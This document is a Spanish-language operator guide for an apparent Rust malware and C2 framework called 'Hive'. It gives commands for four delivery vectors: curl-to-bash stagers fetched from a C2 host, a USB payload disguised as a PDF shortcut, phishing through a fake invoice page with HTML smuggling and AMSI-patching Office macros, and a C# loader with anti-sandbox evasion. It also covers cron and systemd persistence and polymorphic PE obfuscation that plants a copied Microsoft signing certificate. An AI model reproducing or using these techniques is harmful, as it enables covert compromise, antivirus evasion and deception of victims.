# Deployment Guide 🐝

```
  PREPARACIÓN                        DISTRIBUCIÓN                       EJECUCIÓN
  ╔════════════╗     ╔══════════════════╗     ╔═══════════════════╗
  ║ cargo build ║────▶║ deploy.sh        ║────▶║ Target: bash/ps1  ║
  ║ --release   ║     ║ network | usb    ║     ║ queen extrae todo ║
  ║             ║     ║ phishing | exe   ║     ║ colonia desplegada║
  ╚════════════╝     ╚══════════════════╝     ╚═══════════════════╝
                           │                           │
                           ▼                           ▼
                    ┌──────────────┐           ┌──────────────────┐
                    │ --obfuscate  │           │ /tmp/.h/         │
                    │ PE polimorfo │           │ queen worker ... │
                    └──────────────┘           │ C2 corriendo     │
                                               └──────────────────┘
```

## Índice

| Sección | Descripción |
|---------|-------------|
| [1. Build](#1-build) | Compilación del proyecto Rust |
| [2. Scripts](#2-scripts) | Catálogo de scripts de despliegue |
| [3. Vector Network](#3-network--stager-remoto) | Stager vía curl/bash |
| [4. Vector USB](#4-usb--auto-instalador) | Pendrive auto-ejecutable |
| [5. Vector Phishing](#5-phishing--html--vba) | HTML smuggling + macro Office |
| [6. Vector EXE](#6-exe--c-loader) | C# loader + payload cifrado |
| [7. Stager Monolítico](#7-stager-monolítico-build_payloadsh) | Script todo-en-uno |
| [8. PE Obfuscation](#8-pe-obfuscation) | 8 técnicas polimórficas |
| [9. Pipeline Completa](#9-pipeline-completa) | Ejemplos reales |

---

## 1. Build

```
┌─────────────────────────────────────────────────────────────┐
│                     cargo build --release                    │
│                                                             │
│  queen ──── worker ──── drone ──── honeybee ──── weaver ──── swarm  │
│  c2-server ─── stinger                                       │
└─────────────────────────────────────────────────────────────┘
                          │
                          ▼
              ┌───────────────────────┐
              │  target/release/      │
              │  ├── queen            │
              │  ├── worker           │
              │  ├── drone            │
              │  ├── honeybee         │
              │  ├── weaver           │
              │  ├── swarm            │
              │  ├── c2-server        │
              │  └── stinger          │
              └───────────────────────┘
```

### Linux nativo

```bash
# Build completo (todos los agentes + C2)
cargo build --release --workspace

# Solo un agente (más rápido para desarrollo)
cargo build --release -p queen
cargo build --release -p worker
```

### Windows cross-compile

```bash
# 1. Instalar toolchain (una vez)
./setup_cross.sh win

# 2. Compilar
cargo build --release --target x86_64-pc-windows-gnu -p queen
cargo build --release --target x86_64-pc-windows-gnu -p worker
# ...

# Output: target/x86_64-pc-windows-gnu/release/queen.exe
```

| Flag | Propósito |
|------|-----------|
| `--release` | Optimizaciones de tamaño y velocidad |
| `--workspace` | Compila todos los paquetes |
| `-p <nombre>` | Compila solo un paquete |
| `--target x86_64-pc-windows-gnu` | Cross-compile a Windows |

---

## 2. Scripts

```
scripts/
│
├── deploy.sh             ◀── Generador principal (4 vectores)
├── build_payload.sh      ◀── Stager monolítico
├── launch_colony.sh      ◀── Despliegue local Docker
├── obfuscate_pe.py       ◀── PE obfuscator v2.2
└── scenario.sh           ◀── Tests de escenarios
```

| Script | Input | Output | Dependencias |
|--------|-------|--------|-------------|
| `deploy.sh` | Bins en `target/release/` | `payloads/<vector>/` | python3, gzip, base64 |
| `build_payload.sh` | Bins en `target/release/` | `hive_payload.sh` | python3, gzip |
| `launch_colony.sh` | Docker images | Contenedores | docker, docker-compose |
| `obfuscate_pe.py` | `.exe` compilado | `.exe` ofuscado | python3, WSL (para cert) |
| `scenario.sh` | Contenedores corriendo | Logs de test | docker |

### Pipeline típica

```
┌─────────┐    ┌──────────┐    ┌─────────────┐    ┌──────────────┐
│ cargo   │───▶│ deploy.sh │───▶│ USB / HTTP  │───▶│ Target       │
│ build   │    │ vector X  │    │ / phishing  │    │ ejecuta      │
└─────────┘    └──────────┘    └─────────────┘    └──────────────┘
                                                         │
                                                         ▼
                                                  ┌──────────────┐
                                                  │ queen        │
                                                  │ worker       │
                                                  │ drone        │
                                                  │ honeybee     │
                                                  │ weaver       │
                                                  │ swarm        │
                                                  │ c2-server    │
                                                  └──────────────┘
```

### Flags globales

| Flag | Valores | Default | Descripción |
|------|---------|---------|-------------|
| `--windows` | — | off | Target Windows (.exe en vez de ELF) |
| `--obfuscate` | — | off | PE obfuscation (solo con --windows) |
| `--c2-host` | hostname | `your-c2.com` | C2 al que reportan los agentes |
| `--c2-port` | puerto | `8444` | Puerto del C2 |
| `--help` | — | — | Muestra ayuda |

> ⚠️ **--obfuscate** solo funciona con `--windows`. En Linux no tiene efecto.

---

## 3. Network — Stager remoto

```
┌──────────┐     ┌───────────────┐     ┌────────────────┐
│ C2 Server│◀────│ Target Linux  │◀────│ Operator       │
│ :8444    │     │ curl | bash   │     │ deploy.sh net  │
└──────────┘     └──────────────┘     └────────────────┘
```

Ideal para despliegue remoto donde el target tiene conectividad al C2.

### Uso

```bash
# 1. Generar payloads
./scripts/deploy.sh network --c2-host mi-c2.com

# Output:
# payloads/network/
# ├── stager.sh        # Script bash (~250 bytes)
# ├── payload.b64      # Manifiesto cifrado
# └── oneliner.txt     # One-liner para copiar/pegar
```

### 2. Hostear en el C2

```
payload.b64  ──────▶  Servir en http://mi-c2.com:8444/payload
stager.sh    ──────▶  Servir en http://mi-c2.com:8444/stager
```

### 3. Ejecutar en target

```bash
# Opción A: one-liner directo
curl -sL http://mi-c2.com:8444/stager | bash

# Opción B: descargar y ejecutar
wget -q http://mi-c2.com:8444/stager -O /tmp/.s
bash /tmp/.s
```

### Formato del payload

```
╔══════════════════════════════════════════════════════════════╗
║  payload.b64                                                ║
║  ┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    ║
║  │ Padding  │  │ XOR 0xA3 │  │ GZip     │  │ Base64   │    ║
║  │ 128 b    │  │ cifrado  │  │ comprim. │  │ encode   │    ║
║  └─────────┘  └──────────┘  └──────────┘  └──────────┘    ║
╚══════════════════════════════════════════════════════════════╝
```

### Windows

```bash
./scripts/deploy.sh network --windows --obfuscate --c2-host mi-c2.com
# Genera mismos archivos pero con .exe embebidos y ofuscados
```

---

## 4. USB — Auto-instalador

```
┌──────────────┐     ┌──────────────┐     ┌───────────────────────┐
│ Operator     │────▶│ USB/Pendrive │────▶│ Target sin internet   │
│ deploy.sh usb│     │ .install.sh  │     │ bash .install.sh     │
│              │     │ manifest.dat │     │   o                   │
│              │     │ .ps1         │     │ powershell .ps1      │
└──────────────┘     └──────────────┘     └───────────────────────┘
```

Para targets **sin conectividad** a Internet. Todo viaja en la USB.

### Uso

```bash
# 1. Generar payload USB
./scripts/deploy.sh usb --c2-host 10.0.0.5

# Output:
# payloads/usb/
# ├── .install.sh           # Stager Linux (archivo oculto)
# ├── manifest.dat          # Todos los bins cifrados
# └── readme.pdf.lnk.ps1    # Stager Windows

# 2. Copiar a la USB
cp -r payloads/usb/* /media/pendrive/
```

### En target Linux

```bash
# Montar USB (si no auto-monta)
sudo mount /dev/sdb1 /mnt

# Ejecutar stager
bash /mnt/.install.sh
```

**Qué pasa:**
```
 1. .install.sh lee manifest.dat
 2. Decodifica: Base64 → XOR → GZip
 3. Extrae todos los bins a /tmp/.h/
 4. Ejecuta queen → queen orquesta al resto
 5. Stager se auto-destruye

        ╔══════════════╗
        │  /tmp/.h/    │
        │  ├── queen   │
        │  ├── worker  │
        │  ├── drone   │
        │  ├── honeybee│
        │  ├── weaver  │
        │  ├── swarm   │
        │  └── c2-server│
        ╚══════════════╝
```

### En target Windows

```powershell
# Desde Explorer: doble clic en D:\, o:
powershell -ExecutionPolicy Bypass -File D:\readme.pdf.lnk.ps1
```

**Qué pasa:**
```
 1. PowerShell lee manifest.dat
 2. Decodifica: [Convert]::FromBase64String → XOR → GZipStream
 3. Extrae a %TEMP%\.h\
 4. Ejecuta queen.exe oculto (WindowStyle.Hidden)
```

### Estructura de manifest.dat

```
╔═══════════════════════════════════════════════════════════════════╗
║  manifest.dat  (cifrado)                                         ║
║                                                                   ║
║  queen|base64_data...                                             ║
║  worker|base64_data...                                            ║
║  drone|base64_data...                                             ║
║  honeybee|base64_data...                                          ║
║  weaver|base64_data...                                            ║
║  swarm|base64_data...                                             ║
║  c2-server|base64_data...                                         ║
║                                                                   ║
║  Cada línea: <nombre>|<base64(XOR(padding + gzip(bin)))>         ║
╚═══════════════════════════════════════════════════════════════════╝
```

### Windows + obfuscation

```bash
./scripts/deploy.sh usb --windows --obfuscate --c2-host 10.0.0.5
# .exe ofuscados antes de ser embebidos en manifest.dat
```

---

## 5. Phishing — HTML + VBA

```
┌──────────────┐     ┌──────────────┐     ┌───────────────────┐
│ Operator     │────▶│ Victim       │────▶│ Stager se ejecuta │
│ deploy.sh    │     │ Abre HTML    │     │ Queen desplegado  │
│ phishing     │     │ o macro.doc  │     │                   │
└──────────────┘     └──────────────┘     └───────────────────┘
```

Dos vectores de entrada: **HTML smuggling** (navegador) o **macro VBA** (Office).

### Uso

```bash
./scripts/deploy.sh phishing --c2-host mi-c2.com --c2-port 443

# Output:
# payloads/phishing/
# ├── invoice_<ts>.html    # → para enviar por email
# └── macro_hive.bas       # → para injectar en documento Office
```

### Vector HTML

```
┌─────────────────────────────────────────────────────────────┐
│  invoice_1712345678.html                                    │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  INVOICE OVERDUE                                     │   │
│  │                                                      │   │
│  │  Please download your statement below.               │   │
│  │                                                      │   │
│  │  [Download Invoice (PDF)]  ◄─── víctima hace clic    │   │
│  │                                                      │   │
│  │  ─────────────────────────────────────────────────   │   │
│  │                                                      │   │
│  │  Al hacer clic:                                      │   │
│  │  1. fetch() a http://mi-c2.com:443/stager            │   │
│  │  2. Crea iframe oculto                               │   │
│  │  3. Inyecta stager como script                       │   │
│  │  4. Stager descarga payload                          │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Vector VBA (Office)

La macro se injecta en un documento Word/Excel legítimo:

```vba
' macro_hive.bas — Cargar en documento Office
'
' Al abrir el documento (AutoOpen / Workbook_Open):
'   1. Parchea AMSI en memoria (ret 0xC3)
'   2. Descarga stager desde C2
'   3. Ejecuta oculto (CreateNoWindow)
'   4. Stager extrae colonia completa
'
' Inyectar:
'   dev-cmd: copy /b doc_legitimo.docm + macro_hive.bas doc_infectado.docm
```

```bash
# Inyectar en documento existente
python3 -c "
with open('payloads/phishing/macro_hive.bas') as f:
    macro = f.read()
# Inyectar en documento .docm o .xlsm
# (requiere python-pptx o similar)
print('Macro lista para inyección manual')
"
```

---

## 6. EXE — C# Loader

```
┌──────────────┐     ┌──────────────┐     ┌─────────────────────┐
│ Operator     │────▶│ Windows      │────▶│ hive_loader.exe     │
│ cross-compile│     │ loader.cs    │     │ + queen.b64         │
│ + obfuscate  │     │ compile.bat  │     │ → extrae y ejecuta  │
└──────────────┘     └──────────────┘     └─────────────────────┘
```

Loader en C# que no requiere compilación Rust en el target. Solo .NET Framework.

### Uso

```bash
# 1. Cross-compile Queen a Windows
cargo build --release --target x86_64-pc-windows-gnu -p queen

# 2. Generar C# loader + payload cifrado
./scripts/deploy.sh exe --windows --c2-host 10.0.0.5

# 3. (Opcional) con PE obfuscation
./scripts/deploy.sh exe --windows --obfuscate --c2-host 10.0.0.5

# Output:
# payloads/executable/
# ├── loader.cs          # Código fuente C#
# ├── queen.b64          # Queen cifrado
# ├── compile.sh         # Compilación en Linux (mono)
# └── compile.bat        # Compilación en Windows (csc)
```

### 2. Compilar loader

```bash
# En Linux:
cd payloads/executable && bash compile.sh
# → hive_loader.exe (~10 KB)

# En Windows:
cd payloads\executable
csc loader.cs -out:hive_loader.exe -reference:System.IO.Compression.dll -target:winexe
```

### 3. Distribuir

```
Distribuir AMBOS archivos juntos:
├── hive_loader.exe    ← C# loader compilado
└── queen.b64          ← payload cifrado (en mismo directorio)
```

### Anatomía del loader (C# v2)

```
┌─────────────────────────────────────────────────────────────────┐
│  HIVE C# Loader v2                                              │
│                                                                 │
│  Main()                                                         │
│  ├── Sleep(2000-5000ms)          ← Anti-sandbox: evade análisis │
│  │                                de tiempo real                │
│  ├── PatchAMSI()                                                 │
│  │   └── GetProcAddress("AmsiScanBuffer") → ret 0xC3            │
│  │                                ← Bypass AMSI en memoria      │
│  ├── Read queen.b64                                              │
│  ├── Decrypt()                                                   │
│  │   └── XOR → GZip → queen.exe                                 │
│  ├── Write %TEMP%\.h\queen.exe                                   │
│  └── Process.Start(queen.exe)                                    │
│       └── WindowStyle=Hidden                                     │
│           CreateNoWindow=true   ← Sin ventana                    │
└─────────────────────────────────────────────────────────────────┘
```

### Técnicas de evasión del loader

| Técnica | Implementación | Propósito |
|---------|---------------|-----------|
| Anti-sandbox | `Thread.Sleep(2-5s)` | Evade análisis de tiempo real |
| AMSI patch | Escribir `0xC3` en `AmsiScanBuffer` | Evita detección por AMSI |
| API hashing | `GetProcAddress` dinámico | Sin imports directos sospechosos |
| Hidden execution | `CreateNoWindow` + `WindowStyle.Hidden` | Sin ventana visible |
| Payload cifrado | XOR + GZip + Base64 | Sin firmas conocidas en disco |
| PE obfuscation | `--obfuscate` flag | Polimorfismo binario |

---

## 7. Stager Monolítico (`build_payload.sh`)

```
┌────────────────────────────────────────────────────────────────┐
│  hive_payload.sh                                               │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  #!/usr/bin/env bash                                     │  │
│  │  # Hive Colony Stager — self-extracting                  │  │
│  │                                                          │  │
│  │  decode_queen() { base64 -d << 'B64EOF'                 │  │
│  │  H4sIAAAAAAACA+2...       ◄── base64 del queen cifrado  │  │
│  │  B64EOF                                                   │  │
│  │  }                                                        │  │
│  │                                                          │  │
│  │  decode_worker() { base64 -d << 'B64EOF'                │  │
│  │  H4sIAAAAAAACA+4...       ◄── base64 del worker cifrado │  │
│  │  B64EOF                                                   │  │
│  │  }                                                        │  │
│  │  ... (drone, honeybee, weaver, swarm, c2-server)          │  │
│  │                                                          │  │
│  │  # Extracción + XOR decrypt + GZip + ejecución           │  │
│  │  for agent in queen worker ...; do                       │  │
│  │      decode_$agent | python3 -c "..." > /tmp/.hive/$agent│  │
│  │  done                                                     │  │
│  │                                                          │  │
│  │  # Lanzar C2 + agentes                                   │  │
│  │  /tmp/.hive/c2-server --port 8444 ...                    │  │
│  │  /tmp/.hive/queen > /dev/null 2>&1 &                    │  │
│  │  /tmp/.hive/worker > /dev/null 2>&1 &                   │  │
│  │  ...                                                      │  │
│  └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

### Uso

```bash
# Generar stager
./scripts/build_payload.sh                              # Linux
./scripts/build_payload.sh --windows --obfuscate        # Windows + PE obf
./scripts/build_payload.sh --output colonia.sh          # Nombre custom

# En target:
bash colonia.sh

# Con persistencia:
HIVE_PERSIST=1 bash colonia.sh
```

### Persistencia

Cuando `HIVE_PERSIST=1`, el stager instala:

```
┌──────────────────────────────────────────────────────────────┐
│  Persistencia                                               │
│                                                              │
│  Linux:                                                     │
│    ├── ~/.config/systemd/user/hive-colony.service           │
│    │   └── systemctl --user enable                          │
│    └── crontab: */5 * * * * /tmp/.hive/queen                │
│                                                              │
│  Windows: (próximamente)                                    │
│    ├── Registry: HKCU\...\Run                               │
│    └── Scheduled Task                                       │
└──────────────────────────────────────────────────────────────┘
```

---

## 8. PE Obfuscation

Post-procesa un `.exe` compilado aplicando 8 técnicas polimórficas.
**Cada build produce un binario diferente** (SHA256 único).

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
│ queen.exe    │────▶│ obfuscate_pe.py  │────▶│ queen_obf.exe│
│ (original)   │     │                  │     │ (polimorfo)  │
│ SHA256: A    │     │ 8 técnicas       │     │ SHA256: B    │
│              │     │ diferentes       │     │ SHA256: C    │
│              │     │ cada ejecución   │     │ SHA256: D... │
└──────────────┘     └──────────────────┘     └──────────────┘
```

### Uso

```bash
# Básico
./scripts/obfuscate_pe.py queen.exe -o queen_obf.exe

# Solo SHA256 (para scripting)
./scripts/obfuscate_pe.py queen.exe --quiet
# → a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0

# Desactivar técnicas específicas
./scripts/obfuscate_pe.py queen.exe -o queen_obf.exe \
    --no-dummies \
    --no-overlay \
    --no-cert

# Ruta custom de certificado
./scripts/obfuscate_pe.py queen.exe -o queen_obf.exe \
    --cert-path /tmp/mi_cert.bin
```

### Las 8 técnicas

```
╔══════════════════════════════════════════════════════════════════╗
║                     PE Obfuscator v2.2                          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                ║
║  1. Sección renaming                                           ║
║     ┌──────┐     ┌──────┐     ┌──────┐                        ║
║     │.text │────▶│XK9M2P │     Cada build: nombre aleatorio    ║
║     │.data │────▶│Q7R3N8 │     8 caracteres A-Z0-9            ║
║     │.rdata│────▶│B5F1V6 │                                     ║
║     └──────┘     └──────┘                                      ║
║                                                                ║
║  2. Overlay entrópico                                          ║
║     ┌──────────────┐ ┌────────────────────┐                    ║
║     │ PE original  │ │ 2-10KB aleatorio  │                    ║
║     └──────────────┘ └────────────────────┘                    ║
║                                                                ║
║  3. Dummy sections                                             ║
║     ┌──────┬──────┬──────┬──────┐                              ║
║     │.text │.data │DUMMY1│DUMMY2│  1-3 secciones falsas       ║
║     └──────┴──────┴──────┴──────┘  con datos aleatorios        ║
║                                                                ║
║  4. Rich header scrub                                          ║
║     ┌────────────────────┐    ┌────────────────────┐           ║
║     │ Rich[MSVC] v1.2.3  │───▶│ datos aleatorios   │           ║
║     │ build 12345        │    │ (no metadatos)     │           ║
║     └────────────────────┘    └────────────────────┘           ║
║                                                                ║
║  5. Debug directory kill                                       ║
║     ┌──────────────┐    ┌──────────────┐                       ║
║     │ Debug entry  │───▶│ RVA=0, Size=0│                       ║
║     │ CV: RSDS     │    │ (eliminado)  │                       ║
║     └──────────────┘    └──────────────┘                       ║
║                                                                ║
║  6. Cert injection (Authenticode)                              ║
║     ┌────────────────────────────────────┐                     ║
║     │ Security Directory apunta a:       │                     ║
║     │ PKCS#7 SignedData                 │                     ║
║     │   issuer: Microsoft Corporation   │ ←─ de ntdll.dll     ║
║     │   serial: 33:00:00:00...          │                     ║
║     └────────────────────────────────────┘                     ║
║                                                                ║
║  7. Entropy normalization                                      ║
║     ┌──────────────┬────────────┬──────────────┐               ║
║     │ Sección      │ GAP (zeros)│ Siguiente    │               ║
║     │ .text        │ (padding)  │ sección      │               ║
║     └──────────────┴────────────┴──────────────┘               ║
║                                                                ║
║  8. Checksum fix                                               ║
║     ┌────────────┐    ┌────────────┐                           ║
║     │ checksum: 0│───▶│ checksum:  │  Recalculado             ║
║     │ (inválido) │    │ 0x7A3F    │  (válido)                 ║
║     └────────────┘    └────────────┘                           ║
║                                                                ║
╚══════════════════════════════════════════════════════════════════╝
```

### Polimorfismo verificado

```
Build 1: SHA256  a1b2c3d4e5f6...  (queen.exe original)
Build 2: SHA256  b2c3d4e5f6a7...  (12/12 builds, 0 duplicados)
Build 3: SHA256  c3d4e5f6a7b8...  ✅ Polimorfismo funcional
Build 4: SHA256  d4e5f6a7b8c9...
...
```

### Extracción del certificado

El script extrae automáticamente un certificado Authenticode real de Microsoft desde `ntdll.dll` en WSL:

```python
# Auto-extract desde /mnt/c/Windows/System32/ntdll.dll
# Busca el Security Directory en el PE
# Extrae el blob PKCS#7 firmado por Microsoft
# Lo inyecta en el binario target
```

### Flags de control

| Flag | Técnica que desactiva | Útil cuando... |
|------|----------------------|----------------|
| `--no-rename` | Sección renaming | Querés mantener nombres originales |
| `--no-overlay` | Overlay entrópico | El binario ya tiene overlay |
| `--no-dummies` | Dummy sections | Necesitás tamaño mínimo |
| `--no-rich` | Rich header scrub | Querés preservar metadatos MSVC |
| `--no-debug` | Debug directory kill | Necesitás debug symbols |
| `--no-cert` | Cert injection | Ya tenés tu propia firma |
| `--no-entropy` | Entropy normalization | Ya tenés padding manual |
| `--no-checksum` | Checksum fix | Lo va a firmar otro tool |

---

## 9. Pipeline Completa

### Pipeline 1: Linux → despliegue local

```bash
# 1. Compilar
cargo build --release --workspace

# 2. Generar todos los vectores
./scripts/deploy.sh all

# 3. Desplegar localmente (Docker)
./scripts/launch_colony.sh

# 4. Verificar
curl http://localhost:8444/health
# → {"status":"ok","agents":6}
```

### Pipeline 2: Windows → USB

```bash
# 1. Cross-compile todos los agentes
./setup_cross.sh win
for p in queen worker drone honeybee weaver swarm c2-server; do
    cargo build --release --target x86_64-pc-windows-gnu -p "$p"
done

# 2. Generar payload USB con ofuscación
./scripts/deploy.sh usb --windows --obfuscate --c2-host 192.168.1.100

# 3. Copiar a USB
cp -r payloads/usb/* /media/pendrive/

# 4. Conectar USB al target Windows
#    → powershell -ExecutionPolicy Bypass -File D:\readme.pdf.lnk.ps1
```

### Pipeline 3: Phishing + C2 externo

```bash
# 1. Compilar solo queen (stager descarga al resto)
cargo build --release --target x86_64-pc-windows-gnu -p queen

# 2. Generar payload phishing
./scripts/deploy.sh phishing --windows --c2-host evil.c2.com --c2-port 443

# 3. Hostear stager en el C2
cp payloads/network/stager.sh /var/www/html/stager

# 4. Enviar invoice_<ts>.html por email
#    víctima hace clic → descarga stager → colonia desplegada
```

### Pipeline 4: Stager monolítico sigiloso

```bash
# 1. Compilar todo
cargo build --release --workspace

# 2. Generar stager con ofuscación
./scripts/build_payload.sh \
    --windows \
    --obfuscate \
    --output /tmp/actualizacion.sh

# 3. Transferir al target (por cualquier medio: SCP, USB, email...)
scp /tmp/actualizacion.sh user@target:/tmp/

# 4. En target:
bash /tmp/actualizacion.sh
# Colonia completa corriendo en /tmp/.hive/
```

---

### Resumen de comandos rápidos

| Lo que querés hacer | Comando |
|---------------------|---------|
| Compilar todo | `cargo build --release --workspace` |
| Payload USB | `./scripts/deploy.sh usb` |
| Payload Windows + ofuscado | `./scripts/deploy.sh exe --windows --obfuscate` |
| Stager monolítico | `./scripts/build_payload.sh` |
| Solo ofuscar un .exe | `./scripts/obfuscate_pe.py input.exe -o output.exe` |
| Ofuscar sin overlay ni dummies | `./scripts/obfuscate_pe.py input.exe --no-overlay --no-dummies` |
| Despliegue local | `./scripts/launch_colony.sh` |
| Limpiar builds | `cargo clean && rm -rf target/` |
